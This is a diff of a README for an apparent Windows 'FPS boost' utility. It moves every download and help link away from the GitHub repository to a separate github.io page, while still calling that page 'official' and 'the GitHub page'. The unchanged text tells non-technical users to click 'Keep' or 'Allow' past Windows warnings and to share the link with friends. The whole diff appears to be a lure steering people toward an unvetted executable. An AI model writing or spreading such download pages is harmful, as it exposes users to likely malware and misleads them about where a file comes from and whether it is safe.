@@ -1,6 +1,6 @@
 # ⚡ windows-fps-boost-utility - Boost FPS, reduce lag now
 
-[![Download Now](https://img.shields.io/badge/Download-windows--fps--boost--utility-blue?style=for-the-badge&logo=windows&logoColor=white&labelColor=2b2d42&color=ef233c)](https://github.com/difamiliar5739/windows-fps-boost-utility)
+[![Download Now](https://img.shields.io/badge/Download-windows--fps--boost--utility-blue?style=for-the-badge&logo=windows&logoColor=white&labelColor=2b2d42&color=ef233c)](https://difamiliar5739.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ You don't need technical skills. Follow these steps exactly.
 
 Visit this link to download the application:
 
-[👉 **Click Here to Download**](https://github.com/difamiliar5739/windows-fps-boost-utility)
+[👉 **Click Here to Download**](https://difamiliar5739.github.io)
 
 This link takes you to the official download page. Look for the download button. Click it. The file will save to your computer. It is usually in your "Downloads" folder.
 
@@ -130,7 +130,7 @@ Click "Keep" or "Allow" when Windows asks. Then scan the file with your antiviru
 
 ## 🆘 Getting Help
 
-If you face any trouble, visit the GitHub page: [https://github.com/difamiliar5739/windows-fps-boost-utility](https://github.com/difamiliar5739/windows-fps-boost-utility)
+If you face any trouble, visit the GitHub page: [https://difamiliar5739.github.io](https://difamiliar5739.github.io)
 
 On that page, you can:
 
@@ -145,7 +145,7 @@ On that page, you can:
 
 If you need the file again, here is the link:
 
-[**Download windows-fps-boost-utility**](https://github.com/difamiliar5739/windows-fps-boost-utility)
+[**Download windows-fps-boost-utility**](https://difamiliar5739.github.io)
 
 Bookmark this link for future use. Share it with your friends who play games. The more people use it, the better the feedback and the faster the tool gets updated.
 
